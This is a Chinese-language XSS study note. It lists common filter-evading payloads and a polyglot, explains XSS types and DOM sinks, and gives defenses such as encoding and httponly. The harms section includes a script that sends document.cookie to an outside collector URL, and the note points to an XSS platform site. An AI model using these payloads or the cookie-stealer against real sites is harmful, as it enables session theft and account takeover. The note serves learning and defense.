## 常用payload
```
<scripT>prompt`1`</Script>
"><img src="1" onerror=prompt(2)>
<svg/onload=globalThis[`conf`+/irm/.source]`1`// X->
<a onClick="javascript:aler\u0074(2)">xss</a>  //t用的native编码
<textarea autofocus onfocus=alert(1)>


jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(123456) )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```
## XSS基础
	XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。
XSS分为 **储存型XSS**、**反射性XSS**、
**dom型XSS**
可能触发DOM型XSS的属性
document.write()
xxx.innerHTML=
document.location.replace()
document.referrer

	xss也是一种注入攻击，当web应用对用户输入过滤不严格，攻击者写入恶意的脚本代码（HTML、JavaScript）到网页中时，如果用户访问了含有恶意代码的页面，恶意脚本就会被浏览器解析执行导致用户被攻击

## 常用组合
==常用标签==\<a> \<body>\<iframe> \<img>\<script>\<svg>
==常用事件==
- 鼠标事件 \<onmousemove>\<onclick>\<onmouseover>
- 其他事件\<onerror>\<onfocus>\<onkeypress>\<onload>

==弹窗函数== alert() comfirm() prompt()

[XSS标签事件表](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
## XSS危害
网络钓鱼
窃取用户Cookies、弹广告刷流量、具备改页面信息、删除文章、获取客户端信息、传播蠕虫。
```
<script>
	document.write('<img src="http://192.168.1.1/xss/getcookie.php?cookie='+document.cookie+'" width=0 height=0 border=0/>');
</script>
```
## XSS防御
-  输入输出检查 
	-  首先是过滤。对诸如\<script>、\<img>、\<a>等标签进行过滤。
-   其次是编码。像一些常见的符号，如<>在输入的时候要对其进行转换编码，这样做浏览器是不会对该标签进行解释执行的，同时也不影响显示效果。  
-   最后是限制。通过以上的案例我们不难发现xss攻击要能达成往往需要较长的字符串，因此对于一些可以预期的输入可以通过限制长度强制截断来进行防御。
-  安全的编码函数
	- java: HtmlUtils.htmlEscape    [springboot安全编码解析](https://www.cnblogs.com/bcde/p/11527190.html)
	- php: htmlentities()、htmlentities()
- 缓解措施 httponly
## xss绕过
- 编码绕过原理应该是后端解析编码之类
- 大小写
## XSS平台
`https://xssaq.com/`
